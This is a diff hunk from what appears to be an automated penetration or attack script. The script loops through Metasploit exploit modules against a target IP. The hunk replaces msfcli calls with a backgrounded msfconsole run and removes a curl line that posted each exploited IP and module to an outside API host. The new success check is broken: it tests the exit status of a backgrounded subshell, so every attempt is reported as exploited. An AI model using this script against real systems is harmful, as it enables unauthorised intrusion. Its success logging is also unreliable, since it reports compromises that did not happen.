@@ -158,17 +158,13 @@ do
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
                 echo "Using exploit $exploit"
-                msfcli $exploit LHOST=tun0 RHOSTS=$IP E &
-                sleep 5
-                session=$(msfcli sessions -l | grep "meterpreter" | awk '{print $1}')
-                if [ -n "$session" ]
+                (msfconsole -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run" &> /dev/null &)
+                if [ $? -eq 0 ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
-                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=$IP&exploit=$exploit' > /dev/null 2>&1 &
-                    echo "API Reached!"
                     exploitsFound=1
                     exploit_executed=true
-                    break
+                    break 2 # break out of both loops when an exploit is successfully executed
                 else
                     echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                 fi
